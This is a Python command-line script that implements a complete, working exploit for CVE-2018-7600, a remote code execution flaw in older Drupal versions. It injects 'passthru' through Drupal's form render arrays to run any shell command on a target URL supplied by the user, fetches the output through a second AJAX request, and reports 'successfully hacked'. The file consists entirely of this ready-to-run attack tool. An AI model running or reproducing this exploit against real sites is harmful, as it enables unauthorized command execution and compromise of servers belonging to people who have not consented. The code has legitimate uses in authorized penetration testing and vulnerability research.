import argparse
import requests
import re
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# Drupal before 7.58, 8.x before 8.3.9, 
# 8.4.x before 8.4.6, and 8.5.x before 8.5.1 
# allows remote attackers to execute arbitrary code 
# because of an issue affecting multiple subsystems 
# with default or common module configurations.
class CVE2018_7600:
    
    def __init__(self, url, cmd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.cmd = cmd
        self.session = requests.Session()

    # main exploitation logic
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        params = {
            'q' : 'user/password',
            'name[#post_render][]' : 'passthru',
            'name[#markup]' : self.cmd,
            'name[#type]' : 'markup'
        }
        data = {'form_id' : 'user_pass', '_triggering_element_name' : 'name'}
        r = self.session.post(self.url, data = data, params = params, verify = False)
        print (LogColors.YELLOW + "request: " + self.url + "..." + LogColors.ENDC)
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            form_id = m.group(1)
            params = {'q' : 'file/ajax/name/#value/' + form_id}
            data = {'form_build_id' : form_id}
            print (LogColors.YELLOW + "found: " + form_id + LogColors.ENDC)
            r = self.session.post(self.url, data = data, params = params, verify = False)
            result = r.text.split('[{"command":"settings"')[0].strip("\n")
            print (LogColors.YELLOW + result + LogColors.ENDC)
            print (LogColors.GREEN + "successfully hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed. not vulnerable :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-c','--cmd', required = True, help = "command to execute")
    args = vars(parser.parse_args())
    cve = CVE2018_7600(args['url'], args['cmd'])
    cve.exploit()

